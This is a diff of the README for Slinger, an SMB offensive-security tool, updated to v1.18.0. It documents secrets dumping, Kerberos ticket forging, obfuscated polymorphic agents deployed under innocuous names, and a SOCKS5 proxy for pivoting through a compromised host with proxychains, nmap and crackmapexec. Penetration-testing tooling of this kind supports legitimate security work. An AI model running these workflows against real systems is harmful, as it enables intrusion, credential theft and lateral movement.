@@ -25,11 +25,13 @@ Slinger is a versatile tool designed for advanced network interactions and manip
 - **Secrets Dumping** - Extract credentials via SAM/SYSTEM hives and LSA secrets
 
 ### Advanced Features
-- **Cooperative Agent System** - Build polymorphic C++ agents with AES-256-GCM encryption and X25519 key exchange
+- **Cooperative Agent System** - Polymorphic C++ agents with AES-256-GCM encryption over SMB named pipes
+- **SOCKS5 Proxy Tunnel** - Route any tool through a compromised host via named pipe relay
+- **Kerberos Authentication** - Golden/silver ticket forging, clock skew auto-fix, SPN enumeration
+- **Secrets Dumping** - SAM/LSA/NTDS extraction with share-aware temp file paths
 - **Resumable Downloads** - Large file transfers with automatic checkpoint recovery
 - **Command Chaining** - Execute command sequences from scripts or inline with semicolon separation
 - **Network Utilities** - Port forwarding rules, firewall enumeration, IP configuration
-- **Performance Monitoring** - Remote process enumeration and system metrics (experimental)
 
 ## Demo
 
@@ -47,7 +49,7 @@ python3 slinger.py -h
 
       __,_____
      / __.==--"   SLINGER
-    /#(-'             v1.17.0
+    /#(-'             v1.18.0
     `-'                    a ghost-ng special
 
 usage: slinger.py [-h] [--host HOST] [-u USERNAME] [--pass PASSWORD | --ntlm NTLM | --kerberos]
@@ -94,7 +96,7 @@ python3 slinger.py --host 192.168.177.130 --user admin --pass admin
 
       __,_____
      / __.==--"   SLINGER
-    /#(-'             v1.17.0
+    /#(-'             v1.18.0
     `-'                    a ghost-ng special
 
 [*] Connecting to 192.168.177.130:445...
@@ -118,7 +120,7 @@ python3 slinger.py --host 10.0.0.28 --user Administrator --ntlm :5E119EC7919CC3B
 
       __,_____
      / __.==--"   SLINGER
-    /#(-'             v1.17.0
+    /#(-'             v1.18.0
     `-'                    a ghost-ng special
 
 [*] Connecting to 10.0.0.28:445...
@@ -273,35 +275,49 @@ Example Usage: run -c "cmd1;cmd2;cmd3" | run -f script.txt
 ```
 
 
-## Change Tracking
+## System Change Audit Trail
 
-Slinger automatically tracks all write operations performed on the remote target. Every file upload, service change, task creation, registry edit, agent deployment, and command execution is logged with timestamp, category, and details.
+Every operation that touches the remote target is automatically tracked — file uploads, service changes, task creation, registry edits, command execution, temp file artifacts, and process launches. The audit trail captures what was done, when, and how, giving full accountability for every session.
+
+**What gets tracked:**
+
+| Category | Examples |
+|----------|----------|
+| `FILE` | uploads, downloads, deletes, temp files (created+deleted) |
+| `EXEC` | wmiexec, atexec, proxy_start, proxy_stop, secretsdump |
+| `TASK` | scheduled task create/delete via atexec |
+| `SERVICE` | RemoteRegistry start/restore during secretsdump |
+| `REGISTRY` | key/value creates, modifies, deletes |
 
 ```bash
-# View all changes made this session
-[sl] (10.0.0.28):\C$> changes
-+----------+----------+---------+---------------------------+-----------------+---------+
-| Time     | Category | Action  | Target                    | Details         | Status  |
-+==========+==========+=========+===========================+=================+=========+
-| 14:32:01 | FILE     | upload  | C$\Windows\test.exe       | from ./test.exe | success |
-| 14:32:15 | TASK     | create  | SlingerTask               | program=cmd.exe | success |
-| 14:33:02 | EXEC     | atexec  | whoami                    |                 | success |
-+----------+----------+---------+---------------------------+-----------------+---------+
+# View all changes
+changes
 
-Total: 3 change(s) (1 file, 1 task, 1 exec)
+# Example: full proxy lifecycle audit
++----------+------------+------------------+--------------------------------------------+------------------------------------------+
+| Time     | Category   | Action           | Target                                     | Details                                  |
++==========+============+==================+============================================+==========================================+
+| 18:56:06 | FILE       | upload           | C$\Users\Public\Downloads\socksproxy.exe   | from ~/.slinger/proxies/svcproxy_abc.exe |
+| 18:56:06 | FILE       | proxy_deploy     | C$\Users\Public\Downloads\socksproxy.exe   | socksproxy                               |
+| 18:56:06 | EXEC       | wmiexec_dcom     | "C:\Users\Public\Downloads\socksproxy.exe" | PID=7132                                 |
+| 18:56:06 | EXEC       | proxy_start      | socksproxy                                 | method=wmiexec                           |
+| 18:57:37 | EXEC       | proxy_connect    | socksproxy                                 | socks5://127.0.0.1:1080                  |
+| 18:59:33 | EXEC       | proxy_disconnect | socksproxy                                 |                                          |
+| 18:59:33 | EXEC       | wmiexec_dcom     | taskkill /F /IM socksproxy.exe             | PID=8072                                 |
+| 18:59:33 | FILE       | wmiexec_dcom     | C:\Windows\Temp\MkpVmY.txt                 | temp output (created+deleted)            |
+| 18:59:34 | FILE       | delete           | C$\\Windows\Temp\MkpVmY.txt                |                                          |
+| 18:59:34 | EXEC       | proxy_stop       | socksproxy                                 | method=wmiexec                           |
++----------+------------+------------------+--------------------------------------------+------------------------------------------+
+Total: 10 change(s) (4 file, 6 exec)
 
-# Filter by category
-[sl] (10.0.0.28):\C$> changes --category FILE
-
-# Save to JSON file
-[sl] (10.0.0.28):\C$> changes --save
-[+] Changes saved to ~/.slinger/logs/changes_10.0.0.28_20260404_143500.json
-
-# Clear the log
-[sl] (10.0.0.28):\C$> changes --clear
+# Filter and export
+changes --category FILE          # Show only file operations
+changes --category EXEC          # Show only command executions
+changes --save                   # Export to JSON
+changes --clear                  # Reset for next phase
 ```
 
-On exit, if any changes were made, a summary is automatically printed and saved to `~/.slinger/logs/`.
+On session exit, the change summary is automatically printed and saved to `~/.slinger/logs/changes/`.
 
 ### Adding Change Tracking to New Features
 
@@ -361,55 +377,83 @@ brew install cmake mingw-w64
 
 ## Cooperative Agent System
 
-Slinger includes a polymorphic C++ agent system for secure command execution over named pipes via SMB.
+Polymorphic C++ agent for encrypted command execution over SMB named pipes. No new ports opened — all traffic flows over TCP 445.
 
-### Key Features
-- **Polymorphic builds** - Unique binary signatures per build with obfuscation
-- **Encrypted communication** - AES-256-GCM with X25519 key exchange
-- **SMB transport** - Named pipes over TCP 445 only
-- **Cross-architecture** - Windows x86/x64 support
-- **Lifecycle management** - Deploy, execute, check, kill, remove agents
+- **Polymorphic builds** — unique binary per build (compile-time string XOR, function name mangling, control flow obfuscation)
+- **AES-256-GCM encryption** — HMAC-SHA256 challenge-response auth with PBKDF2 key derivation
+- **GUI subsystem binary** — no console window on target (`-mwindows`, `ShowWindow=0`)
+- **Cross-architecture** — x86/x64 Windows targets via MinGW cross-compilation
+- **Full lifecycle** — build, deploy, start, use, check, kill, remove
 
-### Quick Start
-
-**Build, deploy, and use:**
 ```bash
-🤠 (10.0.0.28):> agent build --arch x64 --pass MySecretPass
-🤠 (10.0.0.28):> use C$
-🤠🔥 (10.0.0.28):\\C$> agent deploy ./slinger_agent_x64_12345.exe --path \\ --name updater --start
-[*] Deploying agent: updater.exe
-[+] Agent uploaded successfully
-[*] Starting agent via WMI DCOM...
-[+] Agent started successfully
-🤠🔥 (10.0.0.28):\\C$> agent use updater
-[*] Connecting to agent: updater
-[+] Connected to agent pipe
-[*] Performing passphrase authentication...
+# Build with authentication + obfuscation
+agent build --arch x64 --pass MySecretPass --obfuscate
+
+# Deploy to target and start
+use C$
+agent deploy ~/.slinger/agents/agent_x64.exe --name updater --start
+
+# Connect and execute commands over encrypted named pipe
+agent use updater
 [+] Authentication successful - all communications encrypted
-
 ## agent:updater ## C:\> whoami
-htb\administrator
-
+nt authority\system
 ## agent:updater ## C:\> exit
+
+# Manage
+agent list                     # Show all deployed agents
+agent check updater            # Check if process is running
+agent kill updater             # Kill agent process
+agent start updater            # Restart (wmiexec or --method atexec)
+agent rm updater               # Delete file from target
 ```
 
-**Manage agents:**
+## SOCKS5 Proxy Tunnel
+
+Lightweight SOCKS5 proxy binary that tunnels traffic through SMB named pipes. Deploy to a compromised host and route any tool through it — no new ports opened on the target.
+
+- **Named pipe transport** — all tunnel traffic rides the existing SMB session (TCP 445)
+- **Multiplexed channels** — multiple concurrent SOCKS connections over a single pipe
+- **Same obfuscation as agent** — polymorphic builds, string XOR, GUI subsystem, no console
+- **Encrypted auth** — optional passphrase with HMAC-SHA256 + PBKDF2 (same as agent)
+- **Reconnectable** — proxy stays alive between client sessions, `back` to background, `use` to re-enter
+- **Full audit trail** — all operations tracked in `changes`
+
 ```bash
-🤠🔥 (10.0.0.28):\\C$> agent list                    # Show all deployed agents
-🤠🔥 (10.0.0.28):\\C$> agent check updater            # Check if agent process is running
-🤠🔥 (10.0.0.28):\\C$> agent kill updater              # Kill agent process
-🤠🔥 (10.0.0.28):\\C$> agent start updater             # Restart agent (wmiexec or --method atexec)
-🤠🔥 (10.0.0.28):\\C$> agent reset                     # Kill and remove all agents
+# Build proxy binary
+proxy build --arch x64 --pipe myproxy --pass s3cret --obfuscate
+
+# Deploy and start on target
+use C$
+proxy deploy ~/.slinger/proxies/svcproxy_abc.exe --name myproxy --start
+
+# Connect — starts local SOCKS5 listener
+proxy connect myproxy
+[+] Connected to proxy
+[+] Authentication successful
+[+] SOCKS5 proxy listening on 127.0.0.1:1080
+
+# Use from another terminal with proxychains
+proxychains nmap -sT -Pn 10.10.10.0/24 -p 445
+proxychains crackmapexec smb 10.10.10.5
+
+# Or tunnel another slinger session through the proxy
+proxychains python slinger.py --profile lab --host 127.0.0.1
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
+[+] Successfully logged in to 127.0.0.1:445
+
+# Proxy subshell commands
+proxy> status                  # Active tunnel count
+proxy> back                    # Background (proxy keeps running)
+proxy> stop                    # Shutdown + kill remote process
+
+# Manage from main shell
+proxy use myproxy              # Re-enter subshell
+proxy start myproxy            # Start deployed proxy
+proxy stop myproxy             # Kill remote process
+proxy rm myproxy               # Delete file from target
+proxy list                     # Show deployed proxies
 ```
-
-**See it in action:**
-- [Agent Demo Video](agent_demo.md) - Watch the cooperative agent system in action
-
-For detailed documentation, run:
-```bash
-🤠 (10.0.0.28):> agent -h
-```
-
 
 ## TODO
 
